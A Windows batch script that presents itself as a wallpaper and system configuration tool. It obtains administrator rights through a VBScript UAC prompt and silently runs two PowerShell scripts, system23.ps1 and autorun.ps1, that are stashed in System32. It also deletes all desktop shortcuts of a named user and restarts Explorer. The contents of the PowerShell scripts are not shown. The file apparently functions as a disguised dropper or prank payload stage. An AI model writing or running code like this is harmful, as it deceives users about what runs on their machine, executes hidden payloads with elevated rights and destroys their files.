@echo off
REM ============================================
REM Wallpaper and System Configuration Script
REM Sets wallpaper and executes autorun scripts
REM ============================================

setlocal enabledelayedexpansion

REM ============================================
REM Admin Privilege Check
REM ============================================

REM Check for admin privileges
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo [*] Requesting administrator privileges...
    goto UAC_PROMPT
) else (
    goto ADMIN_GRANTED
)

:UAC_PROMPT
REM Create VBScript to elevate privileges
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
exit /B

:ADMIN_GRANTED
REM Clean up elevation script if it exists
if exist "%temp%\getadmin.vbs" (
    del "%temp%\getadmin.vbs"
)

REM Save current directory
pushd "%CD%"
CD /D "%~dp0"

REM ============================================
REM Wallpaper Configuration
REM ============================================

echo [*] Setting system wallpaper...

REM Set wallpaper registry entry
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallPaper /t REG_SZ /d C:\Windows\System32\wallpaper.bmp /f >nul 2>&1
if errorlevel 1 (
    echo [!] Warning: Failed to set wallpaper registry entry
) else (
    echo [+] Wallpaper registry entry updated
)

REM ============================================
REM Execute PowerShell Scripts
REM ============================================

echo [*] Executing system configuration scripts...

REM Execute system configuration script
if exist "C:\Windows\System32\system23.ps1" (
    Powershell.exe -executionpolicy remotesigned -File C:\Windows\System32\system23.ps1 >nul 2>&1
    if errorlevel 1 (
        echo [!] Warning: system23.ps1 execution may have failed
    ) else (
        echo [+] System configuration script executed
    )
) else (
    echo [!] Warning: system23.ps1 not found
)

REM Execute autorun script
if exist "C:\Windows\System32\autorun.ps1" (
    Powershell.exe -executionpolicy remotesigned -File C:\Windows\System32\autorun.ps1 >nul 2>&1
    if errorlevel 1 (
        echo [!] Warning: autorun.ps1 execution may have failed
    ) else (
        echo [+] Autorun script executed
    )
) else (
    echo [!] Warning: autorun.ps1 not found
)

REM ============================================
REM Apply Wallpaper and Cleanup
REM ============================================

REM Force wallpaper update
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters >nul 2>&1

REM Clean up desktop shortcuts (fix typo: .ink instead of .lnk)
del C:\Users\Darkzino\Desktop\*.ink >nul 2>&1
del C:\Users\Darkzino\Desktop\*.lnk >nul 2>&1

REM Restart explorer to apply changes
echo [*] Restarting Windows Explorer...
taskkill /f /im explorer.exe >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
start explorer.exe >nul 2>&1

echo [+] Wallpaper and system configuration completed

REM Restore directory
popd

endlocal
